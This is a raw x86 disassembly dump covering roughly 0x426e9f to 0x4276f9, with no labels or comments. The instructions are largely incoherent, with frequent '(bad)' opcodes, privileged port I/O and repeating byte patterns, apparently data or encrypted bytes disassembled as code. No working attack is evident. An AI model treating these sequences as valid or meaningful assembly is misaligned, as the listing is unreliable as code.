  426e9f:	push   eax
  426ea0:	lock out dx,eax
  426ea2:	xor    al,0xaf
  426ea5:	xor    BYTE PTR [edi-0x9],0x9
  426ea9:	inc    esi
  426eaa:	mov    dl,0xc
  426eac:	mov    dl,0x86
  426eae:	or     al,0x80
  426eb0:	ja     0x426e61
  426eb2:	adc    BYTE PTR [edi-0x4dd5ac09],0x84
  426eb9:	sub    DWORD PTR [ebx+0x6a],edx
  426ebc:	push   DWORD PTR [edx+0x9eff080]
  426ec2:	pop    esp
  426ec3:	jg     0x426ede
  426ec5:	dec    edi
  426ec6:	std    
  426ec7:	aad    0x21
  426ec9:	or     BYTE PTR [edx+eax*4+0x3a],0x8d
  426ece:	lea    edi,[ebp+ecx*4-0xb]
  426ed2:	and    al,0x6f
  426ed4:	cmp    BYTE PTR [eax+0x77802177],al
  426eda:	jno    0x426f29
  426edc:	xlat   BYTE PTR ds:[ebx]
  426edd:	cmp    eax,0x4dc8d74d
  426ee2:	xlat   BYTE PTR ds:[ebx]
  426ee3:	sub    eax,0x4d25d74d
  426ee8:	xlat   BYTE PTR ds:[ebx]
  426ee9:	sbb    eax,0x8615d74d
  426eee:	cmp    cl,al
  426ef0:	dec    ebp
  426ef1:	dec    ebp
  426ef2:	push   eax
  426ef3:	dec    edi
  426ef4:	xor    cl,BYTE PTR ds:0x77804d4d
  426efa:	cmp    eax,0x8d15dded
  426eff:	aad    0x1b
  426f01:	xor    BYTE PTR [edi+0x3d],0xed
  426f05:	frstor ds:0x80a1d58d
  426f0b:	dec    edi
  426f0c:	xor    cl,BYTE PTR ds:0xf0804d4d
  426f12:	cmp    eax,0xc41d9250
  426f17:	dec    DWORD PTR [ebp-0x29]
  426f1a:	cmp    eax,0x86c8d74d
  426f1f:	mov    WORD PTR [edx+0x4d],gs
  426f22:	dec    ebp
  426f23:	stos   DWORD PTR es:[edi],eax
  426f24:	test   eax,0x35fb70a3
  426f29:	lea    edx,[edi-0x78127880]
  426f2f:	and    DWORD PTR [ecx-0x9748884],ebx
  426f35:	and    al,0x6f
  426f37:	cmp    BYTE PTR [edi+esi*2-0x38],bh
  426f3b:	cmc    
  426f3c:	and    al,0x6f
  426f3e:	cmp    BYTE PTR [eax-0x287f7489],al
  426f44:	mov    esp,edx
  426f46:	or     eax,0x6f242260
  426f4b:	cmp    BYTE PTR [ebx-0x4e],dl
  426f4e:	scas   al,BYTE PTR es:[edi]
  426f4f:	push   ebx
  426f50:	ret    0x86b2
  426f53:	or     al,0xb2
  426f55:	add    ch,BYTE PTR [ecx]
  426f57:	(bad)  
  426f58:	cld    
  426f59:	adc    bh,0xef
  426f5c:	arpl   WORD PTR [edx],si
  426f5e:	xor    BYTE PTR [edi-0x75],0x9
  426f62:	sete   BYTE PTR [ebp-0x287f7273]
  426f69:	mov    edx,DWORD PTR [ebx-0x4e]
  426f6c:	push   ebx
  426f6d:	ret    0x2b2
  426f70:	sub    DWORD PTR [edx-0x300f37a],esi
  426f76:	adc    bh,0x21
  426f79:	arpl   WORD PTR [edx],si
  426f7b:	or     DWORD PTR [edi],ecx
  426f7d:	loopne 0x426f0c
  426f7f:	lea    ecx,[ebp-0x7f8e8880]
  426f85:	xchg   edi,eax
  426f86:	and    DWORD PTR [eax+0x539befd7],eax
  426f8c:	dec    ebp
  426f8d:	push   eax
  426f8e:	ja     0x426f1b
  426f90:	dec    edi
  426f91:	jb     0x426f9c
  426f93:	cmovb  ecx,DWORD PTR [ebp-0x706c7273]
  426f9a:	out    dx,al
  426f9b:	pop    ebx
  426f9c:	adc    BYTE PTR [edi+0x9],dh
  426f9f:	cld    
  426fa0:	ja     0x426fef
  426fa2:	aad    0xfc
  426fa4:	ja     0x426fb9
  426fa6:	sbb    esp,edi
  426fa8:	ja     0x426fa9
  426faa:	ror    BYTE PTR [ecx],1
  426fac:	loopne 0x427025
  426fae:	dec    DWORD PTR [ecx]
  426fb0:	loopne 0x426f59
  426fb2:	adc    ecx,edi
  426fb4:	jp     0x426f43
  426fb6:	lea    ecx,[ebp-0x1ff68bcd]
  426fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fbd:	dec    ebp
  426fbe:	xor    esi,DWORD PTR [eax+edx*1+0x77]
  426fc2:	mov    bh,ah
  426fc4:	ja     0x426f92
  426fc6:	or     eax,0xd40d77fc
  426fcb:	cld    
  426fcc:	ja     0x42701b
  426fce:	jl     0x426fcc
  426fd0:	ja     0x426fe5
  426fd2:	sar    esp,cl
  426fd4:	ja     0x426fd5
  426fd6:	push   esp
  426fd7:	(bad)  
  426fd8:	ja     0x426fd9
  426fda:	(bad)  
  426fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fdc:	adc    esp,DWORD PTR [esi+0x4da78f74]
  426fe2:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  426fe6:	or     eax,0xa78fc40b
  426feb:	int3   
  426fec:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  426ff0:	mov    dl,dh
  426ff2:	sbb    bl,0x35
  426ff5:	in     eax,dx
  426ff6:	out    0x8b,eax
  426ff8:	lea    ecx,[ecx]
  426ffa:	loopne 0x427073
  426ffc:	or     edi,edx
  426ffe:	or     DWORD PTR [edi-0x33],edx
  427001:	lea    ecx,[ebp-0x72e1d073]
  427007:	lea    ecx,[ebp-0x3bf688f0]
  42700d:	inc    DWORD PTR [edi+0x8]
  427010:	lea    ecx,[ebp+0x977108d]
  427016:	div    eax
  427018:	or     DWORD PTR [edi-0x11eff689],ecx
  42701e:	pop    ebx
  42701f:	jnp    0x427084
  427021:	test   DWORD PTR [ecx],ecx
  427023:	jmp    0x80a3:0x4d4d4d9e
  42702a:	ja     0x426ff4
  42702c:	push   ebx
  42702d:	mov    dl,0x80
  42702f:	lock enter 0x5ed,0xd
  427034:	stos   DWORD PTR es:[edi],eax
  427035:	les    esp,FWORD PTR [esi+0x538b7780]
  42703b:	mov    dl,0x80
  42703d:	lock mov edx,DWORD PTR [ebx-0x2]
  427041:	mov    dl,0xba
  427043:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427049:	test   eax,0x8d21fb70
  42704e:	xchg   edi,eax
  42704f:	add    BYTE PTR [edi+0x7cc587ed],0x77
  427056:	mov    dh,dh
  427058:	and    al,0x6f
  42705a:	cmp    cl,dh
  42705c:	cmc    
  42705d:	and    al,0x6f
  42705f:	cmp    BYTE PTR [eax-0x69],dl
  427062:	mov    eax,DWORD PTR [eax+0x77501577]
  427068:	adc    eax,0x80157780
  42706d:	int    0x2e
  42706f:	cmp    cl,BYTE PTR [ebp+0x15f0808d]
  427075:	or     BYTE PTR [ebp+0x3a2e5080],0x8d
  42707c:	lea    eax,[eax+0x657dec30]
  427082:	xchg   ebx,eax
  427083:	push   eax
  427084:	lock stc 
  427086:	xor    BYTE PTR [edi-0x76],0x80
  42708a:	lock mov bl,BYTE PTR [ecx+0x10de29b]
  427091:	out    0x2f,al
  427093:	push   ebx
  427094:	jl     0x427048
  427096:	xchg   BYTE PTR [ebx+eiz*4],cl
  427099:	push   ebx
  42709a:	adc    DWORD PTR [edx-0x4d00d646],esi
  4270a0:	push   eax
  4270a1:	ja     0x427025
  4270a3:	xor    BYTE PTR [edi-0x76],0x80
  4270a7:	lock mov dl,BYTE PTR [ebx+0x7c]
  4270ab:	mov    dl,0x86
  4270ad:	or     al,0x53
  4270af:	adc    DWORD PTR [edx-0x4d00d646],esi
  4270b5:	push   eax
  4270b6:	ja     0x42703c
  4270b8:	xor    BYTE PTR [edi-0x7],0x80
  4270bc:	ins    DWORD PTR es:[edi],dx
  4270bd:	or     ch,ch
  4270bf:	xchg   BYTE PTR [ecx],ah
  4270c1:	push   eax
  4270c2:	ja     0x4270bb
  4270c4:	xor    BYTE PTR [edi-0x7],0x80
  4270c8:	ins    DWORD PTR es:[edi],dx
  4270c9:	pop    ebp
  4270ca:	xor    al,0xf9
  4270cd:	jge    0x42711e
  4270cf:	xchg   edx,eax
  4270d0:	xchg   ebp,eax
  4270d1:	xor    BYTE PTR [edi-0x7],0xd5
  4270d5:	sbb    eax,0x805d6d80
  4270da:	lock stc 
  4270dc:	cmp    BYTE PTR [edi-0x6b],0x7d
  4270e0:	dec    ebx
  4270e1:	div    DWORD PTR [ebx]
  4270e3:	std    
  4270e4:	xor    BYTE PTR [edi-0x7],0x80
  4270e8:	ins    DWORD PTR es:[edi],dx
  4270e9:	pop    ebp
  4270ea:	in     al,dx
  4270eb:	mov    dl,0xc4
  4270ed:	in     al,dx
  4270ee:	sub    BYTE PTR [ebp-0x6b],0x50
  4270f2:	ja     0x42707a
  4270f4:	xor    BYTE PTR [edi-0x76],0x80
  4270f8:	lock mov dl,BYTE PTR [ebx+0x7c]
  4270fc:	push   ebx
  4270fd:	adc    DWORD PTR [edx-0x454df37a],esi
  427103:	sub    edi,edi
  427105:	mov    dl,0x50
  427107:	ja     0x42711e
  427109:	xor    BYTE PTR [edi-0x76],0x80
  42710d:	lock mov dl,BYTE PTR [ebx+0x7c]
  427111:	push   ebx
  427112:	adc    DWORD PTR [edx-0x794dd646],esi
  427118:	or     al,0xff
  42711a:	mov    dl,0x50
  42711c:	ja     0x427133
  42711e:	xor    BYTE PTR [edi-0x76],0x80
  427122:	lock mov dl,BYTE PTR [ebx+0x11]
  427126:	push   ebx
  427127:	jl     0x4270db
  427129:	mov    edx,0xc86b229
  42712e:	push   DWORD PTR [edx+0x5071f080]
  427134:	cmp    dl,BYTE PTR [eax-0x69]
  427137:	adc    eax,0xf415777c
  42713c:	and    al,0x6f
  42713e:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  427142:	repz and al,0x6f
  427145:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  427149:	cli    
  42714a:	and    al,0x6f
  42714c:	cmp    BYTE PTR [esi-0x727290c9],bh
  427152:	xor    BYTE PTR [edi-0x76],0x80
  427156:	lock mov dl,BYTE PTR [ebx+0x7c]
  42715a:	push   ebx
  42715b:	adc    DWORD PTR [edx-0x454df37a],esi
  427161:	sub    edi,edi
  427163:	mov    dl,0x50
  427165:	ja     0x4270eb
  427167:	xor    BYTE PTR [edi-0x7a],0xec
  42716b:	ja     0x42718e
  42716d:	push   eax
  42716e:	ja     0x4270f2
  427170:	dec    ebp
  427171:	xlat   BYTE PTR ds:[ebx]
  427172:	or     BYTE PTR [ebp-0x29],0x21
  427176:	xor    al,0xf9
  427179:	xchg   BYTE PTR [ecx+0x504d4da8],cl
  42717f:	ja     0x427196
  427181:	xor    BYTE PTR [edi+0x15],0x4f
  427185:	push   0xffffffd5
  427187:	(bad)  
  427188:	xor    BYTE PTR [edi-0x7e],0x50
  42718c:	ja     0x427111
  42718e:	xor    BYTE PTR [edi-0x7d],0x80
  427192:	lock and DWORD PTR [ebx-0x4e],eax
  427196:	push   eax
  427197:	ja     0x42711c
  427199:	xor    BYTE PTR [edi+0x15],0x80
  42719d:	lock adc eax,0xec716d80
  4271a3:	xchg   edx,eax
  4271a4:	and    DWORD PTR [eax-0x29c7c10],eax
  4271aa:	in     al,0x19
  4271ac:	xor    BYTE PTR [edi+0x15],0x80
  4271b0:	ins    DWORD PTR es:[edi],dx
  4271b1:	and    DWORD PTR [eax-0x6d13ea10],eax
  4271b7:	out    dx,eax
  4271b8:	xor    al,0x83
  4271bb:	inc    ebx
  4271bc:	mov    dl,0xbe
  4271be:	and    ch,BYTE PTR [edi]
  4271c0:	lea    ecx,[ebp+0x6f24f6fa]
  4271c6:	cmp    BYTE PTR [eax-0x29],dl
  4271c9:	scas   eax,DWORD PTR es:[edi]
  4271ca:	jl     0x427243
  4271cc:	std    
  4271cd:	cmc    
  4271ce:	and    al,0x6f
  4271d0:	cmp    BYTE PTR [edi+esi*2+0x76],bh
  4271d4:	hlt    
  4271d5:	and    al,0x6f
  4271d7:	cmp    BYTE PTR [edi+esi*2+0x6a],bh
  4271db:	repz and al,0x6f
  4271de:	cmp    BYTE PTR [ecx],al
  4271e0:	ja     0x427191
  4271e2:	push   eax
  4271e3:	ja     0x4271ad
  4271e5:	add    DWORD PTR [edi-0x3],esi
  4271e8:	push   eax
  4271e9:	ja     0x42721d
  4271eb:	add    DWORD PTR [edi+0x76],esi
  4271ee:	push   eax
  4271ef:	ja     0x427206
  4271f1:	add    DWORD PTR [edi+0x6a],esi
  4271f4:	push   eax
  4271f5:	ja     0x42717e
  4271f7:	xor    BYTE PTR [edi-0x76],0x80
  4271fb:	lock mov dl,BYTE PTR [ebx+0x7c]
  4271ff:	push   ebx
  427200:	adc    DWORD PTR [edx-0x454df37a],esi
  427206:	sub    edi,edi
  427208:	mov    dl,0x50
  42720a:	ja     0x42718f
  42720c:	mov    esi,0x8d8decfe
  427211:	mov    ds:0x6f24f30d,al
  427216:	cmp    BYTE PTR [ecx],cl
  427218:	shld   esp,ebp,0x8d
  42721c:	(bad)  
  42721d:	loop   0x427240
  42721f:	dec    ebp
  427220:	xlat   BYTE PTR ds:[ebx]
  427221:	add    BYTE PTR [ecx],0x77
  427224:	bound  ecx,QWORD PTR [edx]
  427226:	xchg   BYTE PTR [ecx],cl
  427228:	test   al,0x4d
  42722a:	dec    ebp
  42722b:	xor    BYTE PTR [edi-0x75],0x80
  42722f:	lock mov edx,DWORD PTR [ebx+0x7c]
  427233:	push   ebx
  427234:	adc    DWORD PTR [edx-0x794dd646],esi
  42723a:	or     al,0xff
  42723c:	mov    dl,0x50
  42723e:	ja     0x4271c4
  427240:	push   eax
  427241:	xlat   BYTE PTR ds:[ebx]
  427242:	jp     0x4272b2
  427244:	out    0x7a,eax
  427246:	xor    BYTE PTR [edi+0x7a],0xb2
  42724a:	xchg   BYTE PTR [ebx+edx*2],cl
  42724d:	(bad)  
  42724e:	mov    dl,0x2
  427250:	sub    edi,edi
  427252:	xor    dl,BYTE PTR [eax-0x29]
  427255:	add    DWORD PTR [eax-0xf7f7489],0xffffff8b
  42725c:	push   ebx
  42725d:	adc    DWORD PTR [edx+0x7c5329ba],esi
  427263:	mov    dl,0x86
  427265:	or     al,0xff
  427267:	mov    dl,0x80
  427269:	lock mov eax,DWORD PTR [eax+0x2a538b97]
  427270:	push   ebx
  427271:	xchg   esp,eax
  427272:	mov    dl,0xbe
  427274:	or     al,0xb2
  427276:	clc    
  427277:	sub    edi,edi
  427279:	(bad)  
  42727a:	in     al,dx
  42727b:	mov    dl,0x80
  42727d:	lock adc DWORD PTR [eax-0x29],0x66
  427282:	arpl   bp,di
  427284:	xlat   BYTE PTR ds:[ebx]
  427285:	sub    DWORD PTR [eax-0xf7f7489],eax
  42728b:	mov    edx,DWORD PTR [ebx+0x7c]
  42728e:	push   ebx
  42728f:	adc    DWORD PTR [edx-0x454df37a],esi
  427295:	sub    edi,edi
  427297:	mov    dl,0xa
  427299:	loop   0x4272bc
  42729b:	add    DWORD PTR [edi+0x62],esi
  42729e:	or     al,BYTE PTR [esi+0x4d4d8a4c]
  4272a4:	xor    BYTE PTR [edi-0x76],0x80
  4272a8:	lock mov dl,BYTE PTR [ebx+0x7c]
  4272ac:	push   ebx
  4272ad:	adc    DWORD PTR [edx-0x794dd646],esi
  4272b3:	or     al,0xff
  4272b5:	mov    dl,0x80
  4272b7:	lock and DWORD PTR [ebx-0x3],0xffffffd5
  4272bc:	sub    DWORD PTR [eax-0xf7f7589],eax
  4272c2:	mov    dl,BYTE PTR [ebx+0x7c]
  4272c5:	push   ebx
  4272c6:	adc    DWORD PTR [edx-0x454df37a],esi
  4272cc:	sub    edi,edi
  4272ce:	mov    dl,0xa
  4272d0:	loop   0x4272f3
  4272d2:	add    DWORD PTR [edi+0x62],esi
  4272d5:	or     al,BYTE PTR [esi+0x4d4d8ac9]
  4272db:	xor    BYTE PTR [edi-0x38],0x80
  4272df:	lock enter 0x3080,0x80
  4272e4:	lea    edx,[ebx+0x11]
  4272e7:	push   ebx
  4272e8:	jl     0x42729c
  4272ea:	mov    edx,0xc86b229
  4272ef:	push   DWORD PTR [edx+0x622f758f]
  4272f5:	xor    al,0x8a
  4272f8:	adc    BYTE PTR [edi+0x532a538a],0x94
  4272ff:	mov    dl,0xbe
  427301:	or     al,0xb2
  427303:	clc    
  427304:	sub    DWORD PTR [ecx],ecx
  427306:	loopne 0x427372
  427308:	(bad)  
  427309:	(bad)  
  42730a:	arpl   WORD PTR [edx+0xca20f09],si
  427310:	lea    ecx,[ebp-0x7fcd8880]
  427316:	lock xor al,BYTE PTR [eax+0x538d8030]
  42731d:	adc    DWORD PTR [ebx+0x7c],edx
  427320:	mov    dl,0xba
  427322:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427328:	(bad)  
  427329:	jne    0x42735a
  42732b:	bound  eax,QWORD PTR [eax-0x687f7510]
  427331:	mov    dl,BYTE PTR [ebx+0x2a]
  427334:	push   ebx
  427335:	xchg   esp,eax
  427336:	mov    dl,0xbe
  427338:	or     al,0xb2
  42733a:	clc    
  42733b:	sub    DWORD PTR [ecx],ecx
  42733d:	loopne 0x4273a9
  42733f:	(bad)  
  427340:	(bad)  
  427341:	arpl   WORD PTR [edx+0xcda0f09],si
  427347:	lea    ecx,[ebp-0x7fea8880]
  42734d:	lock adc eax,0x8d803080
  427353:	push   ebx
  427354:	adc    DWORD PTR [ebx+0x7c],edx
  427357:	mov    dl,0xba
  427359:	sub    DWORD PTR [edx-0x4d00f37a],esi
  42735f:	(bad)  
  427360:	jne    0x427391
  427362:	bound  eax,QWORD PTR [eax-0x687f7510]
  427368:	mov    dl,BYTE PTR [ebx+0x2a]
  42736b:	push   ebx
  42736c:	xchg   esp,eax
  42736d:	mov    dl,0xbe
  42736f:	or     al,0xb2
  427371:	clc    
  427372:	sub    DWORD PTR [ecx],ecx
  427374:	loopne 0x4273e0
  427376:	(bad)  
  427377:	(bad)  
  427378:	arpl   WORD PTR [edx+0xc130f09],si
  42737e:	lea    ecx,[ebp-0x7f788880]
  427384:	lock xchg DWORD PTR [eax+0x538d8030],eax
  42738b:	adc    DWORD PTR [ebx+0x7c],edx
  42738e:	mov    dl,0xba
  427390:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427396:	(bad)  
  427397:	jne    0x4273c8
  427399:	bound  eax,QWORD PTR [eax-0x687f7510]
  42739f:	mov    dl,BYTE PTR [ebx+0x2a]
  4273a2:	push   ebx
  4273a3:	xchg   esp,eax
  4273a4:	mov    dl,0xbe
  4273a6:	or     al,0xb2
  4273a8:	clc    
  4273a9:	sub    DWORD PTR [ecx],ecx
  4273ab:	loopne 0x427417
  4273ad:	(bad)  
  4273ae:	(bad)  
  4273af:	arpl   WORD PTR [edx+0x3a830f09],si
  4273b5:	lea    ecx,[ebp-0x7fcd8880]
  4273bb:	lock xor al,BYTE PTR [eax+0x538d8030]
  4273c2:	adc    DWORD PTR [edx+0x7c5329ba],esi
  4273c8:	mov    dl,0x86
  4273ca:	or     al,0xff
  4273cc:	mov    dl,0x8f
  4273ce:	jne    0x4273ff
  4273d0:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  4273d6:	adc    BYTE PTR [edi+0x539080c8],0x2a
  4273dd:	mov    dl,0xbe
  4273df:	or     al,0x53
  4273e1:	xchg   esp,eax
  4273e2:	mov    dl,0xf8
  4273e4:	sub    edi,edi
  4273e6:	dec    BYTE PTR [edi-0x2b9d30cf]
  4273ec:	mov    dl,0x80
  4273ee:	lock adc eax,0x97803080
  4273f4:	adc    eax,0x2a539080
  4273f9:	mov    dl,0xbe
  4273fb:	or     al,0x53
  4273fd:	xchg   esp,eax
  4273fe:	mov    dl,0xf8
  427400:	sub    edi,edi
  427402:	dec    BYTE PTR [edi-0x599d30cf]
  427408:	mov    dl,0x80
  42740a:	lock enter 0x3080,0x80
  42740f:	xchg   edi,eax
  427410:	enter  0x9080,0x53
  427414:	sub    dl,BYTE PTR [ebx-0x6c]
  427417:	mov    dl,0xbe
  427419:	or     al,0xb2
  42741b:	clc    
  42741c:	sub    edi,edi
  42741e:	dec    BYTE PTR [edi-0x29a930cf]
  427424:	std    
  427425:	or     DWORD PTR [edi-0x43],ecx
  427428:	cmp    cl,BYTE PTR [ebp+0x1577808d]
  42742e:	xor    al,0x15
  427431:	xor    BYTE PTR [eax],0x80
  427434:	lea    edx,[ebx+0x11]
  427437:	mov    dl,0xba
  427439:	sub    DWORD PTR [ebx+0x7c],edx
  42743c:	mov    dl,0x86
  42743e:	or     al,0xff
  427440:	mov    dl,0x8f
  427442:	jne    0x427473
  427444:	bound  eax,QWORD PTR [eax+0x308032f0]
  42744a:	adc    BYTE PTR [edi+0x53908032],0x2a
  427451:	mov    dl,0xbe
  427453:	or     al,0x53
  427455:	xchg   esp,eax
  427456:	mov    dl,0xf8
  427458:	sub    edi,edi
  42745a:	dec    BYTE PTR [edi-0x2b9d30cf]
  427460:	mov    dl,0x80
  427462:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  427469:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  427470:	push   ebx
  427471:	xchg   esp,eax
  427472:	mov    dl,0xf8
  427474:	sub    edi,edi
  427476:	dec    BYTE PTR [edi-0x599d30cf]
  42747c:	mov    dl,0x80
  42747e:	lock xor al,BYTE PTR [eax+0x32978030]
  427485:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  42748c:	mov    esi,0x29f8b20c
  427491:	(bad)  
  427492:	dec    BYTE PTR [edi-0x29a930cf]
  427498:	std    
  427499:	or     DWORD PTR [edi-0x38],ecx
  42749c:	lea    ecx,[ebp-0x78887f73]
  4274a2:	xor    al,0x87
  4274a5:	xor    BYTE PTR [eax],0x80
  4274a8:	lea    edx,[ebx+0x11]
  4274ab:	mov    dl,0xba
  4274ad:	sub    DWORD PTR [ebx+0x7c],edx
  4274b0:	mov    dl,0x86
  4274b2:	or     al,0xff
  4274b4:	mov    dl,0x8f
  4274b6:	jne    0x4274e7
  4274b8:	bound  eax,QWORD PTR [eax+0x308015f0]
  4274be:	adc    BYTE PTR [edi+0x53908015],0x2a
  4274c5:	mov    dl,0xbe
  4274c7:	or     al,0x53
  4274c9:	xchg   esp,eax
  4274ca:	mov    dl,0xf8
  4274cc:	sub    edi,edi
  4274ce:	dec    BYTE PTR [edi-0x2b9d30cf]
  4274d4:	mov    dl,0x80
  4274d6:	lock enter 0x3080,0x80
  4274db:	xchg   edi,eax
  4274dc:	enter  0x9080,0x53
  4274e0:	sub    dh,BYTE PTR [edx-0x6bacf342]
  4274e6:	mov    dl,0xf8
  4274e8:	sub    edi,edi
  4274ea:	dec    BYTE PTR [edi-0x599d30cf]
  4274f0:	mov    dl,0x80
  4274f2:	lock adc eax,0x97803080
  4274f8:	adc    eax,0x2a539080
  4274fd:	push   ebx
  4274fe:	xchg   esp,eax
  4274ff:	mov    dl,0xbe
  427501:	or     al,0xb2
  427503:	clc    
  427504:	sub    edi,edi
  427506:	dec    BYTE PTR [edi-0x29a930cf]
  42750c:	std    
  42750d:	or     DWORD PTR [edi-0x33],ecx
  427510:	lea    ecx,[ebp-0x78887f73]
  427516:	xor    al,0x87
  427519:	xor    BYTE PTR [eax],0x80
  42751c:	lea    edx,[ebx+0x11]
  42751f:	mov    dl,0xba
  427521:	sub    DWORD PTR [ebx+0x7c],edx
  427524:	mov    dl,0x86
  427526:	or     al,0xff
  427528:	mov    dl,0x8f
  42752a:	jne    0x42755b
  42752c:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427532:	adc    BYTE PTR [edi+0x539080c8],0x2a
  427539:	mov    dl,0xbe
  42753b:	or     al,0x53
  42753d:	xchg   esp,eax
  42753e:	mov    dl,0xf8
  427540:	sub    edi,edi
  427542:	dec    BYTE PTR [edi-0x2b9d30cf]
  427548:	mov    dl,0x80
  42754a:	lock xor al,BYTE PTR [eax+0x32978030]
  427551:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  427558:	push   ebx
  427559:	xchg   esp,eax
  42755a:	mov    dl,0xf8
  42755c:	sub    edi,edi
  42755e:	dec    BYTE PTR [edi-0x599d30cf]
  427564:	mov    dl,0x80
  427566:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  42756d:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  427574:	mov    esi,0x29f8b20c
  427579:	(bad)  
  42757a:	dec    BYTE PTR [edi-0x29a930cf]
  427580:	std    
  427581:	xlat   BYTE PTR ds:[ebx]
  427582:	jno    0x427585
  427584:	ja     0x4275e8
  427586:	or     al,BYTE PTR [esi+0x4d4dac84]
  42758c:	xor    al,0x5e
  42758f:	arpl   WORD PTR [edx+0x778017d5],si
  427595:	mov    al,BYTE PTR [eax+0x11538af0]
  42759b:	push   ebx
  42759c:	jl     0x427550
  42759e:	mov    edx,0xc86b229
  4275a3:	push   DWORD PTR [edx-0x7f7b88b0]
  4275a9:	ja     0x427536
  4275ab:	adc    bh,0x8b
  4275ae:	xor    BYTE PTR [edi-0x75],0x80
  4275b2:	lock mov edx,DWORD PTR [ebx+0x4b]
  4275b6:	push   ebx
  4275b7:	je     0x42756b
  4275b9:	mov    BYTE PTR [edx+esi*4],cl
  4275bc:	test   BYTE PTR [ecx],ch
  4275be:	push   DWORD PTR [edx]
  4275c0:	in     al,dx
  4275c1:	xlat   BYTE PTR ds:[ebx]
  4275c2:	data16 xor BYTE PTR [edi+0x7a],0x53
  4275c7:	sub    ch,ch
  4275c9:	mov    edx,0x8a84ed8a
  4275ce:	mov    dl,0x88
  4275d0:	sub    esp,ebp
  4275d2:	std    
  4275d3:	inc    DWORD PTR ds:0x24f60ba2
  4275d9:	outs   dx,DWORD PTR ds:[esi]
  4275da:	cmp    BYTE PTR [eax-0xf7f7589],al
  4275e0:	mov    dl,BYTE PTR [ebx+0x11]
  4275e3:	push   ebx
  4275e4:	jl     0x427598
  4275e6:	mov    edx,0xc86b229
  4275eb:	push   DWORD PTR [edx+0x6384f080]
  4275f1:	std    
  4275f2:	or     DWORD PTR [edi],ecx
  4275f4:	pop    ds
  4275f5:	mov    cl,BYTE PTR [ebp+0x4d]
  4275f8:	xor    BYTE PTR [edi-0x76],0x80
  4275fc:	lock mov dl,BYTE PTR [ebx+0x7c]
  427600:	push   ebx
  427601:	adc    DWORD PTR [edx-0x794dd646],esi
  427607:	or     al,0xff
  427609:	mov    dl,0x80
  42760b:	lock test BYTE PTR [ebx-0x3],ah
  42760f:	xlat   BYTE PTR ds:[ebx]
  427610:	sbb    eax,DWORD PTR [eax-0xf7f7489]
  427616:	mov    edx,DWORD PTR [ebx+0x7c]
  427619:	push   ebx
  42761a:	adc    DWORD PTR [edx-0x454df37a],esi
  427620:	sub    edi,edi
  427622:	mov    dl,0xbe
  427624:	jg     0x427660
  427626:	lea    ecx,[ebp-0x6656da1e]
  42762c:	dec    ebp
  42762d:	xlat   BYTE PTR ds:[ebx]
  42762e:	add    BYTE PTR [ecx],0x77
  427631:	push   ss
  427632:	or     al,BYTE PTR [esi+0x4d4da00c]
  427638:	xor    BYTE PTR [edi-0x76],0x80
  42763c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427640:	push   ebx
  427641:	adc    DWORD PTR [edx-0x794dd646],esi
  427647:	or     al,0xff
  427649:	mov    dl,0x80
  42764b:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427650:	xchg   ebx,eax
  427651:	xor    BYTE PTR [edi-0x75],0x80
  427655:	lock mov edx,DWORD PTR [ebx+0x7c]
  427659:	push   ebx
  42765a:	adc    DWORD PTR [edx-0x794dd646],esi
  427660:	or     al,0xff
  427662:	mov    dl,0x80
  427664:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427669:	daa    
  42766a:	xor    BYTE PTR [edi-0x75],0x80
  42766e:	lock mov edx,DWORD PTR [ebx+0x7c]
  427672:	push   ebx
  427673:	adc    DWORD PTR [edx-0x454df37a],esi
  427679:	sub    edi,edi
  42767b:	mov    dl,0xa
  42767d:	cdq    
  42767e:	add    DWORD PTR [edi+0x16],esi
  427681:	or     al,BYTE PTR [esi+0x4d4d8b34]
  427687:	xor    BYTE PTR [edi-0x76],0x80
  42768b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42768f:	push   ebx
  427690:	adc    DWORD PTR [edx-0x454df37a],esi
  427696:	sub    edi,edi
  427698:	mov    dl,0xa
  42769a:	cdq    
  42769b:	add    DWORD PTR [edi+0x16],esi
  42769e:	or     al,BYTE PTR [esi+0x4d4d8b4c]
  4276a4:	xor    BYTE PTR [edi-0x7e],0xec
  4276a8:	cld    
  4276a9:	push   eax
  4276aa:	ja     0x4276c1
  4276ac:	dec    ebp
  4276ad:	xlat   BYTE PTR ds:[ebx]
  4276ae:	ds dec ebp
  4276b0:	xlat   BYTE PTR ds:[ebx]
  4276b1:	adc    eax,0xec367780
  4276b6:	ja     0x4276a7
  4276b8:	or     al,BYTE PTR [esi+0x4d4d82e5]
  4276be:	xor    BYTE PTR [edi-0x76],0x80
  4276c2:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276c6:	push   ebx
  4276c7:	adc    DWORD PTR [edx-0x794dd646],esi
  4276cd:	or     al,0xff
  4276cf:	mov    dl,0x80
  4276d1:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276d7:	xor    BYTE PTR [edi-0x75],0x80
  4276db:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276df:	push   ebx
  4276e0:	adc    DWORD PTR [edx-0x794dd646],esi
  4276e6:	or     al,0xff
  4276e8:	mov    dl,0x80
  4276ea:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276ef:	rol    BYTE PTR [eax-0xf7f7489],0x8b
  4276f6:	push   ebx
  4276f7:	jl     0x4276ab
  4276f9:	xchg   BYTE PTR [ebx+edx*2],cl
